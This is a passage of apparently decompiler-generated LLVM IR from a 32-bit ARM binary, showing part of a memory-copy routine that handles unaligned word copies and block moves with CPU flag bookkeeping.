  store i32 %v5_1a064, i32* %r5.global-to-local, align 4
  %v3_1a068 = udiv i32 %v8_1a050, 65536
  %v4_1a06c = mul i32 %v11_1a050, 65536
  %v5_1a06c = or i32 %v4_1a06c, %v3_1a068
  store i32 %v5_1a06c, i32* @ip, align 4
  %v1_1a070 = inttoptr i32 %v0_1a070 to i32*
  store i32 %v5_1a054, i32* %v1_1a070, align 4
  %v3_1a070 = add i32 %v0_1a070, 4
  %v4_1a070 = inttoptr i32 %v3_1a070 to i32*
  %v5_1a070 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a070, i32* %v4_1a070, align 4
  %v6_1a070 = add i32 %v0_1a070, 8
  %v7_1a070 = inttoptr i32 %v6_1a070 to i32*
  %v8_1a070 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a070, i32* %v7_1a070, align 4
  %v9_1a070 = add i32 %v0_1a070, 12
  %v10_1a070 = inttoptr i32 %v9_1a070 to i32*
  %v11_1a070 = load i32, i32* @ip, align 4
  store i32 %v11_1a070, i32* %v10_1a070, align 4
  %v12_1a070 = add i32 %v0_1a070, 16
  store i32 %v12_1a070, i32* %r0.global-to-local, align 4
  %v0_1a074 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a074 = add i32 %v0_1a074, -16
  store i32 %v1_1a074, i32* %r2.global-to-local, align 4
  %v3_1a074 = sub i32 15, %v0_1a074
  %v4_1a074 = and i32 %v3_1a074, %v0_1a074
  %v5_1a074 = icmp slt i32 %v4_1a074, 0
  %v6_1a074 = icmp slt i32 %v1_1a074, 0
  %v2_1a078 = xor i1 %v6_1a074, %v5_1a074
  br i1 %v2_1a078, label %dec_label_pc_1a07c, label %dec_label_pc_1a04c.dec_label_pc_1a04c_crit_edge

dec_label_pc_1a04c.dec_label_pc_1a04c_crit_edge:  ; preds = %dec_label_pc_1a04c
  %v0_1a04c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1a050.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a04c

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_1a04c
  %v2_1a07c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a07c, i32* @r4, align 4
  %v5_1a07c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a07c, i32* @r5, align 4
  %v1_1a080 = add i32 %v0_1a074, -4
  store i32 %v1_1a080, i32* %r2.global-to-local, align 4
  %v3_1a080 = add i32 %v0_1a074, 2147483632
  %v4_1a080 = and i32 %v1_1a080, %v3_1a080
  %v5_1a080 = icmp slt i32 %v4_1a080, 0
  store i1 %v5_1a080, i1* %cpsr_v.global-to-local, align 1
  %v6_1a080 = icmp slt i32 %v1_1a080, 0
  store i1 %v6_1a080, i1* %cpsr_n.global-to-local, align 1
  %v7_1a080 = icmp eq i32 %v1_1a080, 0
  store i1 %v7_1a080, i1* %cpsr_z.global-to-local, align 1
  %v2_1a084 = xor i1 %v6_1a080, %v5_1a080
  br i1 %v2_1a084, label %dec_label_pc_1a0a0, label %dec_label_pc_1a088

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a07c, %dec_label_pc_1a03c, %dec_label_pc_1a088
  %v1_1a094 = phi i32 [ %v4_1a094, %dec_label_pc_1a088 ], [ %v12_1a070, %dec_label_pc_1a07c ], [ %v0_1a0dc75, %dec_label_pc_1a03c ]
  %v0_1a088 = load i32, i32* %lr.global-to-local, align 4
  %v3_1a088 = udiv i32 %v0_1a088, 65536
  store i32 %v3_1a088, i32* %ip.global-to-local, align 4
  %v0_1a08c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a08c = inttoptr i32 %v0_1a08c to i32*
  %v2_1a08c = load i32, i32* %v1_1a08c, align 4
  store i32 %v2_1a08c, i32* %lr.global-to-local, align 4
  %v4_1a08c = add i32 %v0_1a08c, 4
  store i32 %v4_1a08c, i32* %r1.global-to-local, align 4
  %v4_1a090 = mul i32 %v2_1a08c, 65536
  %v5_1a090 = or i32 %v4_1a090, %v3_1a088
  store i32 %v5_1a090, i32* @ip, align 4
  %v2_1a094 = inttoptr i32 %v1_1a094 to i32*
  store i32 %v5_1a090, i32* %v2_1a094, align 4
  %v3_1a094 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a094 = add i32 %v3_1a094, 4
  store i32 %v4_1a094, i32* %r0.global-to-local, align 4
  %v0_1a098 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a098 = add i32 %v0_1a098, -4
  store i32 %v1_1a098, i32* %r2.global-to-local, align 4
  %v3_1a098 = sub i32 3, %v0_1a098
  %v4_1a098 = and i32 %v3_1a098, %v0_1a098
  %v5_1a098 = icmp slt i32 %v4_1a098, 0
  %v6_1a098 = icmp slt i32 %v1_1a098, 0
  %v2_1a09c = xor i1 %v6_1a098, %v5_1a098
  br i1 %v2_1a09c, label %dec_label_pc_1a0a0.loopexit, label %dec_label_pc_1a088

dec_label_pc_1a0a0.loopexit:                      ; preds = %dec_label_pc_1a088
  %v7_1a098 = icmp eq i32 %v0_1a098, 4
  store i1 %v5_1a098, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1a098, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1a098, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a0a0

dec_label_pc_1a0a0:                               ; preds = %dec_label_pc_1a0a0.loopexit, %dec_label_pc_1a07c
  %v0_19f5c58 = phi i32 [ %v1_1a098, %dec_label_pc_1a0a0.loopexit ], [ %v1_1a080, %dec_label_pc_1a07c ]
  %v0_1a0a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a0a0 = add i32 %v0_1a0a0, -2
  store i32 %v1_1a0a0, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1a0a8:                               ; preds = %dec_label_pc_19fbc
  br i1 %v2_1a040, label %dec_label_pc_1a0f4, label %dec_label_pc_1a0b0

dec_label_pc_1a0b0:                               ; preds = %dec_label_pc_1a0a8
  store i32 %v1_1a03c, i32* %r2.global-to-local, align 4
  %v3_1a0b4 = load i32, i32* @r4, align 4
  store i32 %v3_1a0b4, i32* %stack_var_-16, align 4
  %v6_1a0b4 = load i32, i32* @r5, align 4
  store i32 %v6_1a0b4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a0b8

dec_label_pc_1a0b8:                               ; preds = %dec_label_pc_1a0b8.dec_label_pc_1a0b8_crit_edge, %dec_label_pc_1a0b0
  %v0_1a0dc = phi i32 [ %v12_1a0dc, %dec_label_pc_1a0b8.dec_label_pc_1a0b8_crit_edge ], [ %v0_1a0dc75, %dec_label_pc_1a0b0 ]
  %v0_1a0bc = phi i32 [ %v0_1a0bc.pre, %dec_label_pc_1a0b8.dec_label_pc_1a0b8_crit_edge ], [ %v4_19fc0, %dec_label_pc_1a0b0 ]
  %v0_1a0b8 = phi i32 [ %v0_1a0b8.pre, %dec_label_pc_1a0b8.dec_label_pc_1a0b8_crit_edge ], [ %v2_19fc0, %dec_label_pc_1a0b0 ]
  %v3_1a0b8 = udiv i32 %v0_1a0b8, 16777216
  %v1_1a0bc = inttoptr i32 %v0_1a0bc to i32*
  %v2_1a0bc = load i32, i32* %v1_1a0bc, align 4
  store i32 %v2_1a0bc, i32* %r4.global-to-local, align 4
  %v3_1a0bc = add i32 %v0_1a0bc, 4
  %v4_1a0bc = inttoptr i32 %v3_1a0bc to i32*
  %v5_1a0bc = load i32, i32* %v4_1a0bc, align 4
  store i32 %v5_1a0bc, i32* %r5.global-to-local, align 4
  %v6_1a0bc = add i32 %v0_1a0bc, 8
  %v7_1a0bc = inttoptr i32 %v6_1a0bc to i32*
  %v8_1a0bc = load i32, i32* %v7_1a0bc, align 4
  store i32 %v8_1a0bc, i32* %ip.global-to-local, align 4
  %v9_1a0bc = add i32 %v0_1a0bc, 12
  %v10_1a0bc = inttoptr i32 %v9_1a0bc to i32*
  %v11_1a0bc = load i32, i32* %v10_1a0bc, align 4
  store i32 %v11_1a0bc, i32* %lr.global-to-local, align 4
  %v12_1a0bc = add i32 %v0_1a0bc, 16
  store i32 %v12_1a0bc, i32* %r1.global-to-local, align 4
  %v4_1a0c0 = mul i32 %v2_1a0bc, 256
  %v5_1a0c0 = or i32 %v4_1a0c0, %v3_1a0b8
  store i32 %v5_1a0c0, i32* @r3, align 4
  %v3_1a0c4 = udiv i32 %v2_1a0bc, 16777216
  %v4_1a0c8 = mul i32 %v5_1a0bc, 256
  %v5_1a0c8 = or i32 %v4_1a0c8, %v3_1a0c4
  store i32 %v5_1a0c8, i32* %r4.global-to-local, align 4
  %v3_1a0cc = udiv i32 %v5_1a0bc, 16777216
  %v4_1a0d0 = mul i32 %v8_1a0bc, 256
  %v5_1a0d0 = or i32 %v4_1a0d0, %v3_1a0cc
  store i32 %v5_1a0d0, i32* %r5.global-to-local, align 4
  %v3_1a0d4 = udiv i32 %v8_1a0bc, 16777216
  %v4_1a0d8 = mul i32 %v11_1a0bc, 256
  %v5_1a0d8 = or i32 %v4_1a0d8, %v3_1a0d4
  store i32 %v5_1a0d8, i32* @ip, align 4
  %v1_1a0dc = inttoptr i32 %v0_1a0dc to i32*
  store i32 %v5_1a0c0, i32* %v1_1a0dc, align 4
  %v3_1a0dc = add i32 %v0_1a0dc, 4
  %v4_1a0dc = inttoptr i32 %v3_1a0dc to i32*
  %v5_1a0dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a0dc, i32* %v4_1a0dc, align 4
  %v6_1a0dc = add i32 %v0_1a0dc, 8
  %v7_1a0dc = inttoptr i32 %v6_1a0dc to i32*
  %v8_1a0dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a0dc, i32* %v7_1a0dc, align 4
  %v9_1a0dc = add i32 %v0_1a0dc, 12
  %v10_1a0dc = inttoptr i32 %v9_1a0dc to i32*
  %v11_1a0dc = load i32, i32* @ip, align 4
  store i32 %v11_1a0dc, i32* %v10_1a0dc, align 4
  %v12_1a0dc = add i32 %v0_1a0dc, 16
  store i32 %v12_1a0dc, i32* %r0.global-to-local, align 4
  %v0_1a0e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0e0 = add i32 %v0_1a0e0, -16
  store i32 %v1_1a0e0, i32* %r2.global-to-local, align 4
  %v3_1a0e0 = sub i32 15, %v0_1a0e0
  %v4_1a0e0 = and i32 %v3_1a0e0, %v0_1a0e0
  %v5_1a0e0 = icmp slt i32 %v4_1a0e0, 0
  %v6_1a0e0 = icmp slt i32 %v1_1a0e0, 0
  %v2_1a0e4 = xor i1 %v6_1a0e0, %v5_1a0e0
  br i1 %v2_1a0e4, label %dec_label_pc_1a0e8, label %dec_label_pc_1a0b8.dec_label_pc_1a0b8_crit_edge

dec_label_pc_1a0b8.dec_label_pc_1a0b8_crit_edge:  ; preds = %dec_label_pc_1a0b8
  %v0_1a0b8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1a0bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a0b8

dec_label_pc_1a0e8:                               ; preds = %dec_label_pc_1a0b8
  %v2_1a0e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a0e8, i32* @r4, align 4
  %v5_1a0e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a0e8, i32* @r5, align 4
  %v1_1a0ec = add i32 %v0_1a0e0, -4
  store i32 %v1_1a0ec, i32* %r2.global-to-local, align 4
  %v3_1a0ec = add i32 %v0_1a0e0, 2147483632
  %v4_1a0ec = and i32 %v1_1a0ec, %v3_1a0ec
  %v5_1a0ec = icmp slt i32 %v4_1a0ec, 0
  store i1 %v5_1a0ec, i1* %cpsr_v.global-to-local, align 1
  %v6_1a0ec = icmp slt i32 %v1_1a0ec, 0
  store i1 %v6_1a0ec, i1* %cpsr_n.global-to-local, align 1
  %v7_1a0ec = icmp eq i32 %v1_1a0ec, 0
  store i1 %v7_1a0ec, i1* %cpsr_z.global-to-local, align 1
  %v2_1a0f0 = xor i1 %v6_1a0ec, %v5_1a0ec
  br i1 %v2_1a0f0, label %dec_label_pc_1a10c, label %dec_label_pc_1a0f4

dec_label_pc_1a0f4:                               ; preds = %dec_label_pc_1a0e8, %dec_label_pc_1a0a8, %dec_label_pc_1a0f4
  %v1_1a100 = phi i32 [ %v4_1a100, %dec_label_pc_1a0f4 ], [ %v12_1a0dc, %dec_label_pc_1a0e8 ], [ %v0_1a0dc75, %dec_label_pc_1a0a8 ]
  %v0_1a0f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_1a0f4 = udiv i32 %v0_1a0f4, 16777216
  store i32 %v3_1a0f4, i32* %ip.global-to-local, align 4
  %v0_1a0f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a0f8 = inttoptr i32 %v0_1a0f8 to i32*
  %v2_1a0f8 = load i32, i32* %v1_1a0f8, align 4
  store i32 %v2_1a0f8, i32* %lr.global-to-local, align 4
  %v4_1a0f8 = add i32 %v0_1a0f8, 4
  store i32 %v4_1a0f8, i32* %r1.global-to-local, align 4
  %v4_1a0fc = mul i32 %v2_1a0f8, 256
  %v5_1a0fc = or i32 %v4_1a0fc, %v3_1a0f4
  store i32 %v5_1a0fc, i32* @ip, align 4
  %v2_1a100 = inttoptr i32 %v1_1a100 to i32*
  store i32 %v5_1a0fc, i32* %v2_1a100, align 4
  %v3_1a100 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a100 = add i32 %v3_1a100, 4
  store i32 %v4_1a100, i32* %r0.global-to-local, align 4
  %v0_1a104 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a104 = add i32 %v0_1a104, -4
  store i32 %v1_1a104, i32* %r2.global-to-local, align 4
  %v3_1a104 = sub i32 3, %v0_1a104
  %v4_1a104 = and i32 %v3_1a104, %v0_1a104
  %v5_1a104 = icmp slt i32 %v4_1a104, 0
  %v6_1a104 = icmp slt i32 %v1_1a104, 0
  %v2_1a108 = xor i1 %v6_1a104, %v5_1a104
  br i1 %v2_1a108, label %dec_label_pc_1a10c.loopexit, label %dec_label_pc_1a0f4

dec_label_pc_1a10c.loopexit:                      ; preds = %dec_label_pc_1a0f4
  %v7_1a104 = icmp eq i32 %v0_1a104, 4
  store i1 %v5_1a104, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1a104, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1a104, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a10c

dec_label_pc_1a10c:                               ; preds = %dec_label_pc_1a10c.loopexit, %dec_label_pc_1a0e8
  %v0_19f5c59 = phi i32 [ %v1_1a104, %dec_label_pc_1a10c.loopexit ], [ %v1_1a0ec, %dec_label_pc_1a0e8 ]
  %v0_1a10c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a10c = add i32 %v0_1a10c, -1
  store i32 %v1_1a10c, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1a114:                               ; preds = %entry
  %v1_1a114 = load i32, i32* @r2, align 4
  %v2_1a114 = add i32 %v1_1a114, %v0_19ec0
  store i32 %v2_1a114, i32* %r1.global-to-local, align 4
  %v2_1a118 = add i32 %v1_1a114, %v1_19ec0
  store i32 %v2_1a118, i32* %r0.global-to-local, align 4
  %v2_1a11c = add i32 %v1_1a114, -4
  store i32 %v2_1a11c, i32* %r2.global-to-local, align 4
  %v4_1a11c = sub i32 3, %v1_1a114
  %v5_1a11c = and i32 %v4_1a11c, %v1_1a114
  %v6_1a11c = icmp slt i32 %v5_1a11c, 0
  store i1 %v6_1a11c, i1* %cpsr_v.global-to-local, align 1
  %v7_1a11c = icmp slt i32 %v2_1a11c, 0
  store i1 %v7_1a11c, i1* %cpsr_n.global-to-local, align 1
  %v8_1a11c = icmp eq i32 %v1_1a114, 4
  store i1 %v8_1a11c, i1* %cpsr_z.global-to-local, align 1
  %v5_1a120 = icmp slt i32 %v1_1a114, 4
  br i1 %v5_1a120, label %bb150, label %dec_label_pc_1a124

dec_label_pc_1a124:                               ; preds = %dec_label_pc_1a114
  %v1_1a124 = urem i32 %v2_1a118, 4
  store i32 %v1_1a124, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a124 = icmp eq i32 %v1_1a124, 0
  store i1 %v2_1a124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a124, label %dec_label_pc_1a12c, label %dec_label_pc_1a1cc

dec_label_pc_1a12c:                               ; preds = %dec_label_pc_1a124
  %v1_1a12c = urem i32 %v2_1a114, 4
  store i32 %v1_1a12c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a12c = icmp eq i32 %v1_1a12c, 0
  store i1 %v2_1a12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a12c, label %dec_label_pc_1a134, label %dec_label_pc_1a1f8

dec_label_pc_1a134:                               ; preds = %dec_label_pc_1a12c, %dec_label_pc_1a1f0
  %v0_1a14c36 = phi i32 [ %v2_1a118, %dec_label_pc_1a12c ], [ %v0_1a24019, %dec_label_pc_1a1f0 ]
  %v0_1a14835 = phi i32 [ %v2_1a114, %dec_label_pc_1a12c ], [ %v0_1a1f0, %dec_label_pc_1a1f0 ]
  %v0_1a134 = phi i32 [ %v2_1a11c, %dec_label_pc_1a12c ], [ %v2_1a1e8, %dec_label_pc_1a1f0 ]
  %v2_1a134 = add i32 %v0_1a134, -8
  store i32 %v2_1a134, i32* %r2.global-to-local, align 4
  %v4_1a134 = sub i32 7, %v0_1a134
  %v5_1a134 = and i32 %v4_1a134, %v0_1a134
  %v6_1a134 = icmp slt i32 %v5_1a134, 0
  store i1 %v6_1a134, i1* %cpsr_v.global-to-local, align 1
  %v7_1a134 = icmp slt i32 %v2_1a134, 0
  store i1 %v7_1a134, i1* %cpsr_n.global-to-local, align 1
  %v8_1a134 = icmp eq i32 %v0_1a134, 8
  store i1 %v8_1a134, i1* %cpsr_z.global-to-local, align 1
  %v5_1a138 = icmp slt i32 %v0_1a134, 8
  br i1 %v5_1a138, label %dec_label_pc_1a184, label %dec_label_pc_1a13c

dec_label_pc_1a13c:                               ; preds = %dec_label_pc_1a134
  %v3_1a13c = load i32, i32* @r4, align 4
  %v5_1a13c = inttoptr i32 %v3_1a13c to i8*
  store i8* %v5_1a13c, i8** %stack_var_-8, align 4
  %v8_1a13c = load i32, i32* @lr, align 4
  %v2_1a140 = add i32 %v0_1a134, -28
  store i32 %v2_1a140, i32* %r2.global-to-local, align 4
  %v4_1a140 = sub i32 27, %v0_1a134
  %v5_1a140 = and i32 %v4_1a140, %v2_1a134
  %v6_1a140 = icmp slt i32 %v5_1a140, 0
  store i1 %v6_1a140, i1* %cpsr_v.global-to-local, align 1
  %v7_1a140 = icmp slt i32 %v2_1a140, 0
  store i1 %v7_1a140, i1* %cpsr_n.global-to-local, align 1
  %v8_1a140 = icmp eq i32 %v2_1a134, 20
  store i1 %v8_1a140, i1* %cpsr_z.global-to-local, align 1
  %v5_1a144 = icmp slt i32 %v2_1a134, 20
  br i1 %v5_1a144, label %dec_label_pc_1a160, label %dec_label_pc_1a148

dec_label_pc_1a148:                               ; preds = %dec_label_pc_1a13c, %dec_label_pc_1a148.dec_label_pc_1a148_crit_edge
  %v0_1a14c = phi i32 [ %v1_1a154, %dec_label_pc_1a148.dec_label_pc_1a148_crit_edge ], [ %v0_1a14c36, %dec_label_pc_1a13c ]
  %v0_1a148 = phi i32 [ %v0_1a148.pre, %dec_label_pc_1a148.dec_label_pc_1a148_crit_edge ], [ %v0_1a14835, %dec_label_pc_1a13c ]
  %v1_1a148 = add i32 %v0_1a148, -4
  %v2_1a148 = inttoptr i32 %v1_1a148 to i32*
  %v3_1a148 = load i32, i32* %v2_1a148, align 4
  %v4_1a148 = add i32 %v0_1a148, -8
  %v5_1a148 = inttoptr i32 %v4_1a148 to i32*
  %v6_1a148 = load i32, i32* %v5_1a148, align 4
  store i32 %v6_1a148, i32* %r4.global-to-local, align 4
  %v7_1a148 = add i32 %v0_1a148, -12
  %v8_1a148 = inttoptr i32 %v7_1a148 to i32*
  %v9_1a148 = load i32, i32* %v8_1a148, align 4
  store i32 %v9_1a148, i32* %ip.global-to-local, align 4
  %v10_1a148 = add i32 %v0_1a148, -16
  %v11_1a148 = inttoptr i32 %v10_1a148 to i32*
  %v12_1a148 = load i32, i32* %v11_1a148, align 4
  store i32 %v12_1a148, i32* %lr.global-to-local, align 4
  store i32 %v10_1a148, i32* %r1.global-to-local, align 4
  %v1_1a14c = add i32 %v0_1a14c, -16
  %v2_1a14c = inttoptr i32 %v1_1a14c to i32*
  store i32 %v3_1a148, i32* %v2_1a14c, align 4
  %v4_1a14c = add i32 %v0_1a14c, -12
  %v5_1a14c = inttoptr i32 %v4_1a14c to i32*
  %v6_1a14c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1a14c, i32* %v5_1a14c, align 4
  %v7_1a14c = add i32 %v0_1a14c, -8
  %v8_1a14c = inttoptr i32 %v7_1a14c to i32*
  %v9_1a14c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1a14c, i32* %v8_1a14c, align 4
  %v10_1a14c = add i32 %v0_1a14c, -4
  %v11_1a14c = inttoptr i32 %v10_1a14c to i32*
  %v12_1a14c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a14c, i32* %v11_1a14c, align 4
  store i32 %v1_1a14c, i32* %r0.global-to-local, align 4
  %v0_1a150 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a150 = add i32 %v0_1a150, -4
  %v2_1a150 = inttoptr i32 %v1_1a150 to i32*
  %v3_1a150 = load i32, i32* %v2_1a150, align 4
  store i32 %v3_1a150, i32* @r3, align 4
  %v4_1a150 = add i32 %v0_1a150, -8
  %v5_1a150 = inttoptr i32 %v4_1a150 to i32*
  %v6_1a150 = load i32, i32* %v5_1a150, align 4
  store i32 %v6_1a150, i32* %r4.global-to-local, align 4
  %v7_1a150 = add i32 %v0_1a150, -12
  %v8_1a150 = inttoptr i32 %v7_1a150 to i32*
  %v9_1a150 = load i32, i32* %v8_1a150, align 4
  store i32 %v9_1a150, i32* @ip, align 4
  %v10_1a150 = add i32 %v0_1a150, -16
  %v11_1a150 = inttoptr i32 %v10_1a150 to i32*
  %v12_1a150 = load i32, i32* %v11_1a150, align 4
  store i32 %v12_1a150, i32* %lr.global-to-local, align 4
  store i32 %v10_1a150, i32* %r1.global-to-local, align 4
  %v1_1a154 = add i32 %v0_1a14c, -32
  %v2_1a154 = inttoptr i32 %v1_1a154 to i32*
  store i32 %v3_1a150, i32* %v2_1a154, align 4
  %v4_1a154 = add i32 %v0_1a14c, -28
  %v5_1a154 = inttoptr i32 %v4_1a154 to i32*
  %v6_1a154 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1a154, i32* %v5_1a154, align 4
  %v7_1a154 = add i32 %v0_1a14c, -24
  %v8_1a154 = inttoptr i32 %v7_1a154 to i32*
  %v9_1a154 = load i32, i32* @ip, align 4
  store i32 %v9_1a154, i32* %v8_1a154, align 4
  %v10_1a154 = add i32 %v0_1a14c, -20
  %v11_1a154 = inttoptr i32 %v10_1a154 to i32*
  %v12_1a154 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1a154, i32* %v11_1a154, align 4
  store i32 %v1_1a154, i32* %r0.global-to-local, align 4
  %v0_1a158 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a158 = add i32 %v0_1a158, -32
  store i32 %v2_1a158, i32* %r2.global-to-local, align 4
  %v6_1a15c = icmp slt i32 %v0_1a158, 32
  br i1 %v6_1a15c, label %dec_label_pc_1a160.loopexit, label %dec_label_pc_1a148.dec_label_pc_1a148_crit_edge

dec_label_pc_1a148.dec_label_pc_1a148_crit_edge:  ; preds = %dec_label_pc_1a148
  %v0_1a148.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a148

dec_label_pc_1a160.loopexit:                      ; preds = %dec_label_pc_1a148
  %v4_1a158 = sub i32 31, %v0_1a158
  %v5_1a158 = and i32 %v4_1a158, %v0_1a158
  %v6_1a158 = icmp slt i32 %v5_1a158, 0
  %v7_1a158 = icmp slt i32 %v2_1a158, 0
  store i1 %v6_1a158, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a158, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a160

dec_label_pc_1a160:                               ; preds = %dec_label_pc_1a160.loopexit, %dec_label_pc_1a13c
  %v6_1a168 = phi i32 [ %v1_1a154, %dec_label_pc_1a160.loopexit ], [ %v0_1a14c36, %dec_label_pc_1a13c ]
  %v0_1a170.pr = phi i32 [ %v2_1a158, %dec_label_pc_1a160.loopexit ], [ %v2_1a140, %dec_label_pc_1a13c ]
  %v4_1a160 = add i32 %v0_1a170.pr, 16
  %v6_1a160 = sub i32 0, %v0_1a170.pr
  %v7_1a160 = and i32 %v4_1a160, %v6_1a160
  %v8_1a160 = icmp slt i32 %v7_1a160, 0
  store i1 %v8_1a160, i1* %cpsr_v.global-to-local, align 1
  %v9_1a160 = icmp slt i32 %v4_1a160, 0
  store i1 %v9_1a160, i1* %cpsr_n.global-to-local, align 1
  %v10_1a160 = icmp eq i32 %v4_1a160, 0
  store i1 %v10_1a160, i1* %cpsr_z.global-to-local, align 1
  %v5_1a164 = icmp slt i32 %v0_1a170.pr, -16
  br i1 %v5_1a164, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_1a160
  %v6_1a164 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a164 = add i32 %v6_1a164, -4
  %v8_1a164 = inttoptr i32 %v7_1a164 to i32*
  %v9_1a164 = load i32, i32* %v8_1a164, align 4
  store i32 %v9_1a164, i32* @r3, align 4
  %v10_1a164 = add i32 %v6_1a164, -8
  %v11_1a164 = inttoptr i32 %v10_1a164 to i32*
  %v12_1a164 = load i32, i32* %v11_1a164, align 4
  store i32 %v12_1a164, i32* %r4.global-to-local, align 4
  %v13_1a164 = add i32 %v6_1a164, -12
  %v14_1a164 = inttoptr i32 %v13_1a164 to i32*
  %v15_1a164 = load i32, i32* %v14_1a164, align 4
  store i32 %v15_1a164, i32* @ip, align 4
  %v16_1a164 = add i32 %v6_1a164, -16
  %v17_1a164 = inttoptr i32 %v16_1a164 to i32*
  %v18_1a164 = load i32, i32* %v17_1a164, align 4
  store i32 %v18_1a164, i32* %lr.global-to-local, align 4
  store i32 %v16_1a164, i32* %r1.global-to-local, align 4
  %v7_1a168 = add i32 %v6_1a168, -16
  %v8_1a168 = inttoptr i32 %v7_1a168 to i32*
  store i32 %v9_1a164, i32* %v8_1a168, align 4
  %v10_1a168 = add i32 %v6_1a168, -12
  %v11_1a168 = inttoptr i32 %v10_1a168 to i32*
  %v12_1a168 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_1a168, i32* %v11_1a168, align 4
  %v13_1a168 = add i32 %v6_1a168, -8
  %v14_1a168 = inttoptr i32 %v13_1a168 to i32*
  %v15_1a168 = load i32, i32* @ip, align 4
  store i32 %v15_1a168, i32* %v14_1a168, align 4
  %v16_1a168 = add i32 %v6_1a168, -4
  %v17_1a168 = inttoptr i32 %v16_1a168 to i32*
  %v18_1a168 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_1a168, i32* %v17_1a168, align 4
  store i32 %v7_1a168, i32* %r0.global-to-local, align 4
  %v6_1a16c = load i32, i32* %r2.global-to-local, align 4
  %v7_1a16c = add i32 %v6_1a16c, -16
  store i32 %v7_1a16c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a160, %bb147
  %v6_1a178 = phi i32 [ %v7_1a168, %bb147 ], [ %v6_1a168, %dec_label_pc_1a160 ]
  %v0_1a170 = phi i32 [ %v7_1a16c, %bb147 ], [ %v0_1a170.pr, %dec_label_pc_1a160 ]
  %v4_1a170 = add i32 %v0_1a170, 20
  store i32 %v4_1a170, i32* %r2.global-to-local, align 4
  %v6_1a170 = sub i32 0, %v0_1a170
  %v7_1a170 = and i32 %v4_1a170, %v6_1a170
  %v8_1a170 = icmp slt i32 %v7_1a170, 0
  store i1 %v8_1a170, i1* %cpsr_v.global-to-local, align 1
  %v9_1a170 = icmp slt i32 %v4_1a170, 0
  store i1 %v9_1a170, i1* %cpsr_n.global-to-local, align 1
  %v10_1a170 = icmp eq i32 %v4_1a170, 0
  store i1 %v10_1a170, i1* %cpsr_z.global-to-local, align 1
  %v5_1a174 = icmp slt i32 %v0_1a170, -20
  br i1 %v5_1a174, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_1a174 = load i32, i32* %r1.global-to-local, align 4
  %v7_1a174 = add i32 %v6_1a174, -4
  %v8_1a174 = inttoptr i32 %v7_1a174 to i32*
  %v9_1a174 = load i32, i32* %v8_1a174, align 4
  store i32 %v9_1a174, i32* @r3, align 4
  %v10_1a174 = add i32 %v6_1a174, -8
  %v11_1a174 = inttoptr i32 %v10_1a174 to i32*
  %v12_1a174 = load i32, i32* %v11_1a174, align 4
  store i32 %v12_1a174, i32* @ip, align 4
  %v13_1a174 = add i32 %v6_1a174, -12
  %v14_1a174 = inttoptr i32 %v13_1a174 to i32*
  %v15_1a174 = load i32, i32* %v14_1a174, align 4
  store i32 %v15_1a174, i32* %lr.global-to-local, align 4
  store i32 %v13_1a174, i32* %r1.global-to-local, align 4
  %v7_1a178 = add i32 %v6_1a178, -12
  %v8_1a178 = inttoptr i32 %v7_1a178 to i32*
  store i32 %v9_1a174, i32* %v8_1a178, align 4
  %v10_1a178 = add i32 %v6_1a178, -8
  %v11_1a178 = inttoptr i32 %v10_1a178 to i32*
  %v12_1a178 = load i32, i32* @ip, align 4
